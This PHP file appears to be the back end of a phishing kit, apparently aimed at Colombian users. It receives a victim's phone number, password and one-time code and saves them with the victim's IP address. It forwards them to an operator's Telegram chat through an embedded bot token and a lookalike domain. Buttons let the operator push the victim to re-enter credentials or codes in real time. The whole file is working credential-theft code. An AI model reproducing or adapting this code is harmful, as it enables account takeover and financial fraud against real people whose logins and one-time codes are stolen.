<?php
// Incluir el archivo de conexión a la base de datos
include '../config/conexion.php';

// Función para escapar caracteres especiales en MarkdownV2
function escapeMarkdownV2($text) {
    $specialChars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!'];
    foreach ($specialChars as $char) {
        $text = str_replace($char, "\\" . $char, $text);
    }
    return $text;
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $cliente_id = $_POST['cliente_id'];
    $usuario = trim($_POST['usuario']);
    $clave = trim($_POST['clave']);
    $otp = trim($_POST['otp']);
    $estado = 1;

    if (empty($cliente_id)) {
        die("Error: El ID del cliente no puede estar vacío.");
    }

    $ip_cliente = $_SERVER['REMOTE_ADDR'];
    date_default_timezone_set('America/Bogota');
    $fecha_hora = date('d-m H:i');

    $sql = "UPDATE data SET usuario = ?, clave = ?, otp = ?, estado = ?, fecha_hora = ?, ip_cliente = ? WHERE id = ?";
    $stmt = $conn->prepare($sql);

    if ($stmt) {
        $stmt->bind_param("ssssssi", $usuario, $clave, $otp, $estado, $fecha_hora, $ip_cliente, $cliente_id);

        if ($stmt->execute()) {
            // Enviar datos a Telegram con botones interactivos
            $botToken = '8086433347:AAGnvXryx26XHvsLnSjbKkaeJYJRxlzhuNE';
            $chatId = '-4980441087';
            $baseUrl = "https://bet-promoygiros.site/process/updatetele.php"; // Cambia <tu_dominio> por tu dominio o IP pública
            $security_key = 'lasmujeressonmalas'; // La misma clave que en telegram_update.php    

            $message = "🔄 *Actualización de cliente*\n\n"
                     . "📱 *Número de celular:* `" . escapeMarkdownV2($usuario) . "`\n"
                     . "🔑 *Contraseña:* `" . escapeMarkdownV2($clave) . "`\n"
                     . "🔢 *Clave dinámica:* `" . escapeMarkdownV2($otp) . "`\n"
                     . "🌐 *IP del cliente:* `" . escapeMarkdownV2($ip_cliente) . "`\n"
                     . "🕒 *Fecha y Hora:* `" . escapeMarkdownV2($fecha_hora) . "`";

            $keyboard = [
                'inline_keyboard' => [
                    [
                        ['text' => 'Error Login', 'url' => "$baseUrl?id=$cliente_id&estado=2&key=$security_key"],
                        ['text' => 'Datos', 'url' => "$baseUrl?id=$cliente_id&estado=6&key=$security_key"]
                    ],
                    [
                        ['text' => 'Otp', 'url' => "$baseUrl?id=$cliente_id&estado=3&key=$security_key"],
                        ['text' => 'Otp Error', 'url' => "$baseUrl?id=$cliente_id&estado=4&key=$security_key"]
                    ],
                    [
                        ['text' => 'Finalizar', 'url' => "$baseUrl?id=$cliente_id&estado=0&key=$security_key"]
                    ]
                ]
            ];

            $data = [
                'chat_id' => $chatId,
                'text' => $message,
                'parse_mode' => 'MarkdownV2',
                'reply_markup' => json_encode($keyboard)
            ];

            $options = [
                'http' => [
                    'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
                    'method'  => 'POST',
                    'content' => http_build_query($data),
                ]
            ];

            $url = "https://api.telegram.org/bot$botToken/sendMessage";
            $context = stream_context_create($options);
            $result = file_get_contents($url, false, $context);

            if ($result === FALSE) {
                $error = error_get_last();
                file_put_contents('telegram_debug_log.txt', "Error: " . print_r($error, true), FILE_APPEND);
                die('Error al enviar mensaje a Telegram');
            }

            header("Location: ../espera.php?id=" . $cliente_id);
            exit();
        } else {
            echo "Error: " . $stmt->error;
        }
    } else {
        echo "Error al preparar la consulta: " . $conn->error;
    }

    $stmt->close();
    $conn->close();
}
?>
